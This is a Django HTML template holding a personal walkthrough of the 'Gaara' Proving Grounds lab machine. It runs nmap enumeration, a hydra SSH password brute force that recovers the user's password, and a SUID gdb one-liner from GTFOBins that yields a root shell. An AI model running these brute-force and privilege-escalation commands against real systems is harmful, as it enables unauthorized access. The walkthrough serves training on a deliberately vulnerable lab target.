@@ -1,0 +1,92 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Gaara</h1>
+    <p class="text">Difficulty : Easy | CommunityRating : Easy | MyRating : Easy</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+...</code></pre></div>
+
+<p class="text">Only HTTP and ssh are open.</p>
+<p class="text">However, there are only an image of Naruto's charactor Gaara, and even though I enumerated directories with gobuster using common.txt, there were no additional information. </p>
+<p class="text">While gobuster may reveal new dirs with a sufficiently large wordlist, this machine emphasizes name Gaara. Therefore, I will perform brute force ssh with username Gaara.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>hydra -l gaara -P /usr/share/wordlists/rockyou.txt $IP ssh</u>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-25 10:33:22
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.119.142:22/
+[STATUS] 205.00 tries/min, 205 tries in 00:01h, 14344198 to do in 1166:12h, 12 active
+[22][ssh] host: 192.168.119.142   login: gaara   password: <u>iloveyou2</u>                                                        
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-25 10:34:26</code></pre></div>
+
+
+<p class="text">As predicted, it returned password <u>iloveyou2</u>. We can get ssh connection with gaara user.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>gaara@Gaara:~$ find / -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gdb
+/usr/bin/sudo
+/usr/bin/gimp-2.10
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/umount</code></pre></div>
+
+<p class="text">While I was enumerating user info, I found SUID binary <u>/usr/bin/gdb</u>, which is uncommon output.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/gaara/1.png' %}" alt="">
+    <p class="text">When I searched gdb in GTFOBins, it returned this exploit method. We should get root bash with this code.</p>
+</div>
+
+<div class="code-box"><pre><code>gaara@Gaara:~$ <u>/usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit</u>
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+# id
+uid=1001(gaara) gid=1001(gaara) <u>euid=0(root) egid=0(root) groups=0(root)</u>,1001(gaara)</code></pre></div>
+
+<p class="text">We got root bash.</p>
+
+
+
+</body>
+</html>
